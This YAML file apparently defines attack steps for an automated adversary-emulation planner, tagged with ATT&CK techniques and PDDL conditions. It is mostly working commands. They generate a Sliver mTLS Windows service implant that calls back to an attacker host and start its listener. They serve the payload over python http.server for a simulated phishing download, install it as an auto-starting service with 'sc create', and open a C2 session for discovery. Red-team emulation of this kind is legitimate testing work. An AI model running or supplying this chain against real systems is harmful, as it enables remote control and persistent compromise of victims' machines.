attack_action_sequence:
  - uuid: sliver-payload-windows-service
    name: Build the executable file (service) of a Sliver implant (for Windows)
    id:
      - T1071.001
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      The command is used in the Sliver C2 (Command and Control) framework to generate a service executable payload designed for remote access to a target machine.
    execution:
      executor: Sliver Console
      command: |
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format service --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        required: true
      LPORT:
        default:
        description: listening port of the attacter machine
        required: true
      SAVE_PATH:
        default:
        description: Saved path of the generated payload
        required: true
        pddl_index: string0_var_in_plan
    preconditions:
      - (os-windows ?target - host)
    effects:
      - (sliver-implant-payload ?p - payload ?target - host)
      - (service-payload ?p - payload)
      - (file-payload ?p - payload ?file - file)
      - (file-on-attacker ?path - string ?file - file)
      - (service-exe-file ?file - file)
      - (payload-handler-set ?p - payload)
      - (callback-covered ?file - file)
  - uuid: simulate-download-file
    name: Simulate the victim download a file on its machine
    id:
      - T1566.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Initial Access
    technique:
      - 'Phishing: Spearphishing Link'
    description: This step simulates the victim accidentally downloads a malicious
      file by clicking a link.
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server #{LPORT}

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the file on the attacker's machine
        3. Download the file to #{SAVE_PATH}
    arguments:
      LHOST:
        default:
        description: IP address of the http file server (typically the attacker machine)
        type:
        required: true
      LPORT:
        default: 8000
        description: port of the http file server
        type:
        required: true
      SAVE_PATH:
        default:
        description: Saved path of the downloaded payload
        required: true
        pddl_index: string4_var_in_plan
    preconditions:
      - (allow-simulate-user-action ?target - host)
      - operator: or
        operands:
          - (os-linux ?target - host)
          - (os-windows ?target - host)
          - (os-macos ?target - host)
      - (file-on-attacker ?localpath - string ?file - file)
    effects:
      - (file-exists ?path - string ?file - file ?target - host)
  - uuid: simulate-create-service-windows
    name: Simulate the victim accidentally creates a new service based on a service
      payload file
    id:
      - T1204.002
      - T1543.003
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
      - Persistence
    technique:
      - 'User Execution: Malicious File'
      - 'Create or Modify System Process: Windows Service'
    description:
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On victim's machine, open a powershell as the administrator and run the following commands)

        sc create sliver_svc binPath= "#{SAVE_PATH}" start= auto
        sc start sliver_svc
    arguments:
      SAVE_PATH:
        default:
        description: Saved path of the service executable payload file
        required: true
        pddl_index: string4_var_in_plan
    preconditions:
      - (allow-simulate-user-action ?target - host)
      - (os-windows ?target - host)
      - (service-exe-file ?file - file)
      - (file-exists ?path - string ?file - file ?target - host)
      - (callback-covered ?file - file)
    effects:
      - (file-executed ?file - file ?target - host)
  - uuid: execute-sliver-payload-file
    name: Execute a Sliver Implant Payload
    id:
      - T1071.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      Executing a Sliver implant payload will establish a Sliver session.
    execution:
      executor: Sliver Session Establish
      command: |
        None
    arguments:
    preconditions:
      - (sliver-implant-payload ?p - payload ?target - host)
      - (file-payload ?p - payload ?f - file)
      - (file-executed ?f - file ?target - host)
      - (payload-handler-set ?p - payload)
    effects:
      - (sliver-session ?s - executor ?target - host)
      - operator: When
        params:
          condition: (file-executed-elevated ?f - file ?target - host)
          effect: (elevated-executor ?s - executor)
  - uuid: sliver-pwd
    name: Get Current Working Directory
    id:
      - T1083
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Discovery
    technique:
      - File and Directory Discovery
    description: The `pwd` command returns the current working directory of the remote
      system. It helps to determine the current directory where commands are being
      executed on the remote machine, which is crucial for file management and executing
      further commands. The command includes flags for setting a timeout.
    execution:
      executor: Sliver Executor
      command: pwd(session_id=#{executor})
    arguments:
      executor:
        description: The session ID of the active Sliver connection.
        required: true
        pddl_index: executor4_var_in_plan
    preconditions:
      - operator: or
        operands:
          - (os-windows ?target - host)
          - (os-linux ?target - host)
          - (os-macos ?target - host)
      - (sliver-session ?executorID - executor ?target - host)
    effects:
      - (file-and-directory-info-known ?target - host)
